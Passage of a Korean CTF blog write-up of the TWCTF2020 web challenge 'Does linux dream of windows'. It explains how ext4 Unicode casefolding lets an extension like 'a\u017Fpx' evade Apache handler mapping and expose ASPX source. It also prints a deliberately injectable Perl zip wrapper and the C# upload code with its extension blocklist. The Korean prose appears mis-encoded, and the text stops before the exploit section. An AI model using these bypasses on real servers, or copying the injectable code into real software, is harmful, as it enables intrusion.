<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>TWCTF2020 Does linux dream of windows | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="TWCTF2020 Does linux dream of windows" />
<meta name="author" content="jskim" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì§€ì„­" />
<meta property="og:description" content="ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì§€ì„­" />
<link rel="canonical" href="http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" />
<meta property="og:url" content="http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"TWCTF2020 Does linux dream of windows","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","author":{"@type":"Person","name":"jskim"},"url":"http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977"},"description":"ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì§€ì„­","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">TWCTF2020 Does linux dream of windows</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>CTF</i></center></span>
         
      
         
            <span class="tag"><center><i>Web</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#does-linux-dream-of-windows">Does linux dream of windows?</a>
    <ul>
      <li><a href="#prelude">Prelude</a></li>
      <li><a href="#apache-mod-mono-server">Apache mod-mono-server</a></li>
      <li><a href="#footprinting">Footprinting</a></li>
      <li><a href="#casefolding-ì„-ì§€ì›í•˜ëŠ”-ext4ì˜-ë“±ì¥">casefolding ì„ ì§€ì›í•˜ëŠ” ext4ì˜ ë“±ì¥(!)</a></li>
      <li><a href="#casefolding-test">casefolding test</a></li>
      <li><a href="#flag1">Flag1</a></li>
      <li><a href="#flag2">Flag2</a></li>
      <li><a href="#exploit">Exploit</a></li>
    </ul>
  </li>
</ul>
   
   <p>ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì§€ì„­</p>

<h1 id="does-linux-dream-of-windows">Does linux dream of windows?</h1>

<h2 id="prelude">Prelude</h2>

<p><a href="/assets/dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z">dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z</a></p>

<p><a href="/assets/etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz">etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz</a></p>

<p><img src="/assets/2010js.png" alt="/assets/2010js.png" /></p>

<p>íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì—…ë¡œë“œí•œ íŒŒì¼ì„ ë¦¬ìŠ¤íŒ…í•  ìˆ˜ ìˆëŠ” ì»¨ì…‰ì˜ ì±Œë¦°ì§€ì…ë‹ˆë‹¤. íŠ¹ì´í•œ ê¸°ëŠ¥ì´ë¼ë©´ ê¸°ì¡´ì— ì—…ë¡œë“œí•œ íŒŒì¼ ì´ë¦„ì„ ì••ì¶•(Compress)í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í–ˆë‹¤ëŠ” ì ì¸ë°ìš”. í•´ë‹¹ ë¬¸ì œëŠ” ëŒ€íšŒ ì‹œê°„ ì•½ 48ì‹œê°„ ê¸°ì¤€ìœ¼ë¡œ ë‹¨ 1íŒ€ì˜ ì†”ë²„ë§Œì„ ë°°ì¶œí•´ëƒˆê³  ì´ ë§ˆì €ë„ unintended solutionìœ¼ë¡œ í’€ë ¤ë²„ë¦°, ê½¤ í¥ë¯¸ë¡œìš´ ë¬¸ì œì˜€ìŠµë‹ˆë‹¤.</p>

<h2 id="apache-mod-mono-server">Apache mod-mono-server</h2>

<p><a href="https://github.com/mono/website/blob/gh-pages/docs/web/mod_mono.md">mono/website</a></p>

<p>í•´ë‹¹ ë¬¸ì œì˜ í™˜ê²½ì€ <code class="highlighter-rouge">Linux + mono-server</code> ì…ë‹ˆë‹¤. <code class="highlighter-rouge">mono-server</code>ëŠ” Apache ì›¹ ì—”ì§„ê³¼ í•¨ê»˜ ë¦¬ëˆ…ìŠ¤ì—ì„œ <a href="http://asp.NET">ASP.NET</a> ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë„ë¡ ë•ëŠ” ëª¨ë“ˆì´ë©° ì‹¤ì§ˆì ìœ¼ë¡œ <a href="http://asp.net">ASP.NET</a> ì„ í•¸ë“¤ë§í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js1.png" alt="/assets/2010js1.png" /></p>

<p>ìœ„ ê·¸ë¦¼ì€ mod-mono-serverì˜ ë™ì‘ ê³¼ì •ì„ ê°„ë‹¨í•˜ê²Œ ìš”ì•½í•œ ê·¸ë¦¼ì…ë‹ˆë‹¤. ì‚¬ìš©ìì˜ http requestê°€ ë“¤ì–´ì˜¤ë©´ Apache worker ê°€ í•´ë‹¹ ìš”ì²­ì„ mono-serverë¡œ ê·¸ëŒ€ë¡œ ì „ë‹¬í•´ ì¤ë‹ˆë‹¤. mod-serverëŠ” ì „ë‹¬ë°›ì€ request packetì„ ì‹¤ì§ˆì ìœ¼ë¡œ ì²˜ë¦¬í•˜ê³  ê·¸ì— ë§ëŠ” responseë¥¼ ë‹¤ì‹œ apache workerì— ì „ì†¡í•˜ì—¬ ì‚¬ìš©ìì—ê²Œ ì „ë‹¬í•©ë‹ˆë‹¤.</p>

<p>ë”°ë¼ì„œ í•´ë‹¹ ë¬¸ì œ í™˜ê²½ì€ ë¦¬ëˆ…ìŠ¤ì„ì—ë„ ë¶ˆêµ¬í•˜ê³  mono-server ë°”ì´ë„ˆë¦¬ë¥¼ í†µí•´ aspxê³¼ cs(C#)ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆì—ˆìœ¼ë©°, ë¬¸ì œì— ì£¼ì–´ì§„ ì†ŒìŠ¤ì½”ë“œì—ì„œë„ aspxì™€ cs í™•ì¥ìë¥¼ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/2010js2.png" alt="/assets/2010js2.png" /></p>

<h2 id="footprinting">Footprinting</h2>

<p>upload.aspx ì˜ ì†ŒìŠ¤ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/2010js3.png" alt="/assets/2010js3.png" /></p>

<p>í•´ë‹¹ INDEX.HTM ë¥¼ ëˆŒëŸ¬ë³´ë©´ ë†€ëê²Œë„ index.htmê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. ëŒ€íšŒ ë‹¹ì‹œì—ëŠ” ì›¹ í˜ì´ì§€ì— ì í˜€ìˆëŠ” INDEX.HTM ì´ ë¬´ì—‡ì„ ì‹œì‚¬í•˜ëŠ” ì§€ë¥¼ ë‹¨ë²ˆì— ì•Œì•„ì±„ì§€ ëª»í–ˆìœ¼ë‚˜ INDEX.HTMì— ì ‘ì†í•´ë„ index.htm ê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ë°˜í™˜í•œë‹¤ëŠ” ê²ƒì€ í•´ë‹¹ íŒŒì¼ ì‹œìŠ¤í…œì´ case-insensitive í•˜ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ë¬¼ë¡  ìœˆë„ìš°ì—ì„œ IISë¥¼ í†µí•´ aspxë¥¼ í˜¸ìŠ¤íŒ… í•  ë•Œë„ case-insensitiveí•˜ê²Œ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆì§€ë§Œ ì´ëŠ” ìœˆë„ìš° íŒŒì¼ì‹œìŠ¤í…œì´ ë³¸ë”” case-insensitiveí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ğŸ‘€</p>

<p><img src="/assets/2010js4.png" alt="/assets/2010js4.png" /></p>

<p>case-insensitiveí•œ windows filesystem</p>

<p>ë”°ë¼ì„œ íŒíŠ¸ë¡œ ì œê³µëœ /etc/fstabê³¼ upload.aspxì—ì„œ ë³¼ ìˆ˜ ìˆëŠ” ëŒ€ë¬¸ì INDEX.HTM ë¥¼ í†µí•´ /srv/www.imgê°€ /var/wwwì— ext4ë¡œ ë§ˆìš´íŠ¸ ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆê³ , ì´ë¥¼ í†µí•´ ì €í¬ëŠ” ì´ /var/www/ì— ë§ˆìš´íŠ¸ ëœ íŒŒì¼ ì‹œìŠ¤í…œì´ case-insensitive í•˜ë‹¤ëŠ” ì ì„ ì¶”ì¸¡í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0
LABEL=UEFI	/boot/efi	vfat	defaults	0 0
/srv/www.img /var/www ext4 defaults 0 0
</code></pre></div></div>

<p>ì—¬ê¸°ì„œ ì ê¹â€¦.. ext4ëŠ” linuxì˜ ê³ ìœ  íŒŒì¼ ì‹œìŠ¤í…œì´ë©° ëŒ€ì†Œë¬¸ìë¥¼ ì™„ë²½í•˜ê²Œ êµ¬ë³„í•˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œê³  ê³„ì…¨ì„í…ë°ìš”. (cat flagì™€ cat FLAGëŠ” ë‹¤ë¦„)</p>

<p>ì´ê²Œ ëŒ€ì²´ ì–´ë–»ê²Œ ëœ ì¼ì¼ê¹Œìš”? ğŸ¤”</p>

<h2 id="casefolding-ì„-ì§€ì›í•˜ëŠ”-ext4ì˜-ë“±ì¥">casefolding ì„ ì§€ì›í•˜ëŠ” ext4ì˜ ë“±ì¥(!)</h2>

<p><a href="https://kernelnewbies.org/Linux_5.2#Optional_support_for_case-insensitive_names_in_ext4">Linux_5.2 - Linux Kernel Newbies</a></p>

<p>ì•½ê°„ì˜ êµ¬ê¸€ë§ ëì— 2019ë…„ ì¶œì‹œëœ Linux 5.2 ë²„ì „ì˜ Ext4 íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ê³µì‹ì ìœ¼ë¡œ ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠëŠ”, ìµœì í™”ëœ íŒŒì¼ ì´ë¦„ì„ ì¡°íšŒí•˜ëŠ” ìƒˆë¡œìš´ ê¸°ëŠ¥ì´ ì¶”ê°€ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì¦‰, ext4ì—ì„œ <code class="highlighter-rouge">casefold</code>ë¥¼ ì§€ì›í•˜ëŠ” ì˜µì…˜ì´ ì¶”ê°€ë˜ì—ˆë‹¤ëŠ” ë§ì¸ë°ìš”. ì»¤ë°‹ ë¡œê·¸ë¥¼ ì˜ ì½ì–´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p>

<p><a href="https://github.com/torvalds/linux/commit/b886ee3e778ec2ad43e276fd378ab492cf6819b7">ext4: Support case-insensitive file name lookups Â· torvalds/linux@b886ee3</a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A filesystem that has the casefold feature set is able to configure directories with the +F (EXT4_CASEFOLD_FL) attribute, enabling lookups to succeed in that directory in a case-insensitive fashion, i.e: match a directory entry even if the name used by userspace is not a byte per byte match with the disk name, but is an equivalent case-insensitive version of the Unicode string.  This operation is called a case-insensitive file name lookup.
</code></pre></div></div>

<p><code class="highlighter-rouge">+F</code> í”Œë˜ê·¸ë¥¼ í†µí•´ ë””ë ‰í† ë¦¬ì— <code class="highlighter-rouge">EXT4_CASEFOLD_FL</code> ì†ì„±ì„ ì¶”ê°€í•´ì¤„ ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ F ì†ì„±ì´ ì¶”ê°€ëœ ë””ë ‰í„°ë¦¬ ë‚´ë¶€ì—ì„œëŠ” ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠëŠ”ë‹¤ê³  í•©ë‹ˆë‹¤.  í•˜ì§€ë§Œ ì—¬ê¸°ì„œ ì €í¬ê°€ ì£¼ëª©í•´ì•¼ë  ì ì€ ë°”ë¡œ <code class="highlighter-rouge">case-insensitive version of unicode string</code> ì¸ë°ìš”.</p>

<p>ì´ ì‚¬ì‹¤ì„ ì•Œê³ ë‚œ ë’¤ ë¬¸ì œë¥¼ í’€ì´í•˜ê¸° ìœ„í•œ ëª‡ ê°€ì§€ ì•„ì´ë””ì–´ê°€ ë– ì˜¬ëìŠµë‹ˆë‹¤.</p>

<h2 id="casefolding-test">casefolding test</h2>

<p>ì¼ë‹¨ unicode casefoldingì— ê´€í•œ ëª‡ ê°€ì§€ í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í•´ì•¼ í–ˆìŠµë‹ˆë‹¤. í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•´ <code class="highlighter-rouge">/var/www/html</code> ê²½ë¡œì— test.php íŒŒì¼ì„ ìƒì„±í•˜ê³  apache ëª¨ë“ˆì´ íŒŒì¼ì‹œìŠ¤í…œì˜ ì˜í–¥ì„ ë°›ëŠ”ì§€ë¥¼ í™•ì¸í•´ ë´…ë‹ˆë‹¤. unicode casefolding ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ì„œ unicode character databaseì— ìˆ˜ë¡ë˜ì–´ìˆëŠ” casefolding case ì¤‘ <code class="highlighter-rouge">st</code>ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ê¸€ìë¥¼ ì°¾ì•˜ìŠµë‹ˆë‹¤.</p>

<p><a href="https://www.unicode.org/Public/12.1.0/ucd/CaseFolding.txt"></a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FB06; F; 0073 0074; # LATIN SMALL LIGATURE ST
</code></pre></div></div>

<p><img src="/assets/2010js5.png" alt="/assets/2010js5.png" /></p>

<p>ê·¸ëŸ° ë‹¤ìŒ, test.phpê°€ ì•„ë‹Œ <code class="highlighter-rouge">te\ufb06.php</code> ë¡œ ì ‘ê·¼í•´ë´…ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js6.png" alt="/assets/2010js6.png" /></p>

<p>when the webserver is mounted on non-casefold file system</p>

<p>ì¼ë°˜ì ì¸ case-sensitiveí•œ ext4 íŒŒì¼ì‹œìŠ¤í…œì—ì„œëŠ” ì •ìƒì ìœ¼ë¡œ ë¼ìš°íŒ…ì´ ì´ë£¨ì–´ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ casefold ì˜µì…˜ì´ ì¼œì ¸ìˆëŠ” ext4 íŒŒì¼ì‹œìŠ¤í…œì€ ê³¼ì—° ì–´ë–¨ê¹Œìš”?</p>

<p>í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í•˜ê¸° ìœ„í•´ ext4 casefoldë¥¼ ì§€ì›í•˜ë„ë¡ íŒŒì¼ ì‹œìŠ¤í…œì„ ë§ˆìš´íŠ¸í•œ ë’¤, chattr ì„ í†µí•´ html ê²½ë¡œì— +F ì˜µì…˜ì„ ì£¼ì–´ case-insensitiveí•œ ì†ì„±ì„ ë¶€ì—¬í•©ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js7.png" alt="/assets/2010js7.png" /></p>

<p>ê·¸ëŸ° ë‹¤ìŒ ë˜‘ê°™ì´ test.phpê°€ ì•„ë‹Œ <code class="highlighter-rouge">te\ufb06.php</code> ë¡œ ì ‘ê·¼í•´ë´…ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js8.png" alt="/assets/2010js8.png" /></p>

<p>when the webserver is mounted on ext4 casefold file system</p>

<p>ë†€ëê²Œë„ test.phpë¡œ ì ‘ê·¼ì´ ë©ë‹ˆë‹¤. ì´ ë§ì€ ì¦‰,  ext4 casefold íŒŒì¼ì‹œìŠ¤í…œì—ì„œëŠ” íŒŒì¼ ëª…ì„ byte per byteë¡œ ë³´ì§€ ì•Šê³ , normalizeëœ unicode stringê³¼ ì¼ì¹˜í•˜ëŠ” íŒŒì¼ì„ ëª¨ë‘ ê°™ì€ íŒŒì¼ë¡œ ë³´ê² ë‹¤ëŠ” ì˜ë¯¸ê°€ ë©ë‹ˆë‹¤.</p>

<h2 id="flag1">Flag1</h2>

<p>í˜„ì¬ ë¬¸ì œì—ì„œ ì œê³µë˜ëŠ” ì„œë²„ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/1.png" alt="/assets/1.png" /></p>

<p>Apache ëŠ” mod_mono_auto.confg ëª…ì‹œë˜ì–´ ìˆëŠ” í™•ì¥ìë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìš”ì²­ì„ mono-server ë„˜ê²¨ì¤ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js9.png" alt="/assets/2010js9.png" /></p>

<p>ucdë¥¼ ì°¸ê³ í•˜ì—¬ upload.aspx ì´ë‚˜ upload.aspx.cs ê°€ ì•„ë‹Œ <code class="highlighter-rouge">upload.a\u017Fpx</code> ì´ë‚˜ <code class="highlighter-rouge">upload.a\u017Fpx.c\u017F</code> ì´ëŸ° ì‹ìœ¼ë¡œ ì ‘ê·¼í•˜ê²Œ ë˜ë©´ Apacheì—ì„œëŠ” í•´ë‹¹ ìœ ë‹ˆì½”ë“œë¥¼ casefold í•œ ë’¤ ë§¤ì¹˜ë˜ëŠ” íŒŒì¼ì„ ê³¨ë¼ ë¼ìš°íŒ… í•  ê²ƒì…ë‹ˆë‹¤.</p>

<p>í•˜ì§€ë§Œ Apacheì˜ AddType directive ëŠ” unicodeê°€ ì•„ë‹Œ ì˜¤ì§ ascii ë ˆë²¨ì—ì„œì˜ casefoldingì„ ì§€ì›í•˜ê¸° ë•Œë¬¸ì— ê²°ê³¼ì ìœ¼ë¡œ upload.aspxê°€ mono-serverë¥¼ ê±°ì¹˜ì§€ ì•Šê³  ë¶ˆë ¤ì ¸ upload.aspxì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ì—´ëŒí•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js10.png" alt="/assets/2010js10.png" /></p>

<h2 id="flag2">Flag2</h2>

<p>íŒŒì¼ì„ ì˜¬ë¦¬ê³  ì••ì¶•í•˜ëŠ” ë£¨í‹´ì— command injection ì·¨ì•½ì ì´ ì¡´ì¬í–ˆìŠµë‹ˆë‹¤. ì €í¬ê°€ ì…ë ¥í•œ ì••ì¶•í•  íŒŒì¼ ëª… <code class="highlighter-rouge">uploadedFilename</code> ì´ $ARGV[0]ì— ì§ì ‘ì ìœ¼ë¡œ ë“¤ì–´ê°€ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
<span class="c1">#/bin/file-compressor</span>
<span class="k">my</span> <span class="nv">$contentfile</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="k">my</span> <span class="nv">$zipfile</span> <span class="o">=</span> <span class="nv">$contentfile</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$zipfile</span> <span class="o">=~</span> <span class="sr">/.*\..*\z/</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$zipfile</span> <span class="o">=~</span> <span class="sr">s/(.*)\..*\z/$1.zip/</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nv">$zipfile</span> <span class="o">.=</span> <span class="p">"</span><span class="s2">.zip</span><span class="p">";</span>
<span class="p">}</span>
<span class="k">print</span> <span class="nv">$zipfile</span><span class="p">;</span>
<span class="p">`</span><span class="sb">zip "</span><span class="si">$zipfile</span><span class="sb">" "</span><span class="si">$contentfile</span><span class="sb">"</span><span class="p">`;</span> <span class="c1"># &lt;--- here</span>
</code></pre></div></div>

<p>ì•„ë˜ëŠ” upload.aspx.csì˜ ì½”ë“œ ì¤‘ ì¼ë¶€ë¶„ì…ë‹ˆë‹¤.</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">void</span> <span class="nf">button1_OnClick</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">userDir</span> <span class="p">=</span> <span class="nf">GetUserDir</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(!</span><span class="n">Directory</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">userDir</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">Directory</span><span class="p">.</span><span class="nf">CreateDirectory</span><span class="p">(</span><span class="n">userDir</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(!</span><span class="n">file1</span><span class="p">.</span><span class="n">HasFile</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"No file"</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">var</span> <span class="n">filename</span> <span class="p">=</span> <span class="nf">Sanitize</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(</span><span class="n">filename1</span><span class="p">.</span><span class="n">Text</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(!</span><span class="nf">SecurityCheck</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">file1</span><span class="p">.</span><span class="nf">SaveAs</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">));</span>
    <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Uploaded: "</span> <span class="p">+</span> <span class="n">filename</span><span class="p">;</span>
    <span class="n">uploadedFilename</span><span class="p">.</span><span class="n">Value</span> <span class="p">=</span> <span class="n">filename</span><span class="p">;</span>
    <span class="n">uploadedFilenameTag</span><span class="p">.</span><span class="n">Value</span> <span class="p">=</span> <span class="nf">GenerateHmac</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
    <span class="n">button2</span><span class="p">.</span><span class="n">Enabled</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">protected</span> <span class="k">void</span> <span class="nf">button2_OnClick</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">filename</span> <span class="p">=</span> <span class="n">uploadedFilename</span><span class="p">.</span><span class="n">Value</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(!</span><span class="nf">VerifyHmac</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">uploadedFilenameTag</span><span class="p">.</span><span class="n">Value</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"/"</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">var</span> <span class="n">userDir</span> <span class="p">=</span> <span class="nf">GetUserDir</span><span class="p">();</span>
    <span class="kt">var</span> <span class="n">filepath</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">filepath</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error: not exists"</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">var</span> <span class="n">zipFilename</span> <span class="p">=</span> <span class="nf">CompressFile</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Compressed: "</span> <span class="p">+</span> <span class="n">zipFilename</span><span class="p">;</span>

    <span class="n">File</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="n">filepath</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">...</span>
<span class="k">protected</span> <span class="kt">bool</span> <span class="nf">SecurityCheck</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">string</span> <span class="n">lower</span> <span class="p">=</span> <span class="n">filename</span><span class="p">.</span><span class="nf">ToLower</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".aspx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".asmx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".ashx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".asax"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".ascx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".soap"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".rem"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".axd"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
